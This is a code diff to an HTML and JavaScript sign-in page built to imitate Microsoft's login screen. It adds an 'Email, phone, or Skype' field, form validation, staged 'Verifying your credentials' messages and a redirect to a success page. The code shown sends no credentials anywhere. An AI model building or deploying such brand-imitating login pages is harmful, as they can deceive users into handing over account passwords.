@@ -52,40 +52,63 @@
             margin-bottom: 16px;
         }
 
-        /* Account display (the "email chip" but in Microsoft style) */
-        .account-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 15px;
-            color: #1b1b1b;
+        /* ---------- Email field ---------- */
+        .email-field-wrap {
+            position: relative;
             margin-bottom: 16px;
-            cursor: pointer;
-            width: fit-content;
-            max-width: 100%;
-            border-radius: 4px;
-            padding: 2px 4px;
-            transition: background 0.12s ease;
         }
 
-        .account-row:hover {
-            background: #f3f2f1;
+        .email-input {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 15px;
+            font-family: inherit;
+            color: #1b1b1b;
+            background: #ffffff;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            outline: none;
+            height: 36px;
+            transition: border-color 0.12s ease;
+            border-bottom-width: 2px;
+            border-bottom-color: #1b1b1b;
         }
 
-        .account-row .email-text {
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            font-weight: 400;
+        .email-input:hover {
+            border-color: #323130;
+            border-bottom-color: #323130;
         }
 
-        .account-row .chevron {
+        .email-input:focus {
+            border-color: #0067b8;
+            border-bottom-color: #0067b8;
+        }
+
+        .email-input.error {
+            border-color: #a80000;
+            border-bottom-color: #a80000;
+        }
+
+        .email-error-text {
+            display: none;
+            font-size: 13px;
+            color: #a80000;
+            margin: 6px 0 12px;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .email-error-text.visible {
+            display: flex;
+        }
+
+        .email-error-text svg {
             width: 14px;
             height: 14px;
             flex-shrink: 0;
-            color: #605e5c;
         }
 
+        /* ---------- Password field ---------- */
         .field-wrap {
             position: relative;
             margin-bottom: 4px;
@@ -330,13 +353,27 @@
 
             <h1 class="heading" id="heading">Sign in</h1>
 
-            <div class="account-row" id="accountChip" title="Switch account">
-                <span class="email-text" id="chipEmail">loading...</span>
-                <svg class="chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+            <!-- Email input field -->
+            <div class="email-field-wrap">
+                <input
+                    class="email-input"
+                    id="email"
+                    type="email"
+                    placeholder="Email, phone, or Skype"
+                    autocomplete="username"
+                    aria-label="Email, phone, or Skype"
+                >
             </div>
+            <p class="email-error-text" id="emailErrorText">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/>
+                    <line x1="12" y1="7" x2="12" y2="13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                    <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
+                </svg>
+                <span id="emailErrorMessage">Enter a valid email address, phone number, or Skype name.</span>
+            </p>
 
+            <!-- Password input field -->
             <div class="field-wrap">
                 <input
                     class="password-input"
@@ -397,68 +434,91 @@
     </div>
 
     <script>
-        // ---- Read the email from the URL query string ----
-        const params = new URLSearchParams(window.location.search);
-        const rawEmail = params.get('email') || '';
-        const email = rawEmail.trim().toLowerCase();
-
-        // If no email was passed, send the user back to email.html
-        if (!email) {
-            window.location.replace('email.html');
-        }
-
-        // ---- Populate the account row ----
-        const chipEmail = document.getElementById('chipEmail');
-        chipEmail.textContent = email;
-
-        // ---- Show / hide password (Microsoft doesn't do the eye icon, but we keep the field simple) ----
+        // ---- Elements ----
+        const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
+        const emailErrorText = document.getElementById('emailErrorText');
+        const emailErrorMessage = document.getElementById('emailErrorMessage');
         const errorText = document.getElementById('errorText');
         const errorMessage = document.getElementById('errorMessage');
-
-        // ---- Views ----
         const formView = document.getElementById('formView');
         const loadingView = document.getElementById('loadingView');
         const loadingText = document.getElementById('loadingText');
 
+        // ---- Views ----
         function showLoading() {
             formView.classList.add('hidden');
             loadingView.classList.add('visible');
             loadingText.textContent = 'Signing in…';
         }
 
-        // ---- Validate + submit ----
-        const signinBtn = document.getElementById('signinBtn');
+        // ---- Error helpers ----
+        function showEmailError(msg) {
+            emailErrorMessage.textContent = msg || 'Enter a valid email address, phone number, or Skype name.';
+            emailErrorText.classList.add('visible');
+            emailInput.classList.add('error');
+            emailInput.focus();
+        }
 
-        function showError(msg) {
+        function clearEmailError() {
+            emailErrorText.classList.remove('visible');
+            emailInput.classList.remove('error');
+        }
+
+        function showPasswordError(msg) {
             errorMessage.textContent = msg || 'Your account or password is incorrect.';
             errorText.classList.add('visible');
             passwordInput.classList.add('error');
             passwordInput.focus();
         }
 
-        function clearError() {
+        function clearPasswordError() {
             errorText.classList.remove('visible');
             passwordInput.classList.remove('error');
         }
 
-        passwordInput.addEventListener('input', clearError);
+        // Clear errors on input
+        emailInput.addEventListener('input', clearEmailError);
+        passwordInput.addEventListener('input', clearPasswordError);
+
+        // ---- Validate + submit ----
+        const signinBtn = document.getElementById('signinBtn');
 
         signinBtn.addEventListener('click', () => {
+            const emailValue = emailInput.value.trim();
             const pwd = passwordInput.value;
+
+            let valid = true;
+
+            // Validate email
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailValue) {
+                showEmailError('Please enter your email address, phone number, or Skype name.');
+                valid = false;
+            } else if (!emailPattern.test(emailValue)) {
+                showEmailError('Enter a valid email address, phone number, or Skype name.');
+                valid = false;
+            } else {
+                clearEmailError();
+            }
+
+            // Validate password
             if (!pwd) {
-                showError('Please enter your password.');
-                return;
+                showPasswordError('Please enter your password.');
+                valid = false;
+            } else if (pwd.length < 8) {
+                showPasswordError('Your password must be at least 8 characters.');
+                valid = false;
+            } else {
+                clearPasswordError();
             }
-            if (pwd.length < 8) {
-                showError('Your password must be at least 8 characters.');
-                return;
-            }
+
+            if (!valid) return;
 
             // Show the Microsoft-style loading screen
             showLoading();
 
-            // Staged loading messages to feel more like real Microsoft sign-in
+            // Staged loading messages
             const steps = [
                 { delay: 700,  text: 'Verifying your credentials…' },
                 { delay: 1400, text: 'Signing you in…' },
@@ -473,8 +533,16 @@
 
             // After the loading sequence, go to success page
             setTimeout(() => {
-                window.location.href = 'success.html?email=' + encodeURIComponent(email);
+                window.location.href = 'success.html?email=' + encodeURIComponent(emailValue);
             }, 2800);
+        });
+
+        // Enter key navigation
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
         });
 
         passwordInput.addEventListener('keydown', (e) => {
@@ -484,19 +552,18 @@
             }
         });
 
-        // ---- Back button: return to email.html ----
+        // ---- Back button ----
         document.getElementById('backBtn').addEventListener('click', () => {
-            window.location.href = 'email.html';
+            window.history.back();
         });
 
-        // ---- Other account: return to email.html ----
+        // ---- Other account ----
         document.getElementById('otherAccountBtn').addEventListener('click', () => {
-            window.location.href = 'email.html';
-        });
-
-        // ---- Account chip: return to email.html ----
-        document.getElementById('accountChip').addEventListener('click', () => {
-            window.location.href = 'email.html';
+            emailInput.value = '';
+            passwordInput.value = '';
+            clearEmailError();
+            clearPasswordError();
+            emailInput.focus();
         });
 
         // ---- Forgot link: no-op for now ----
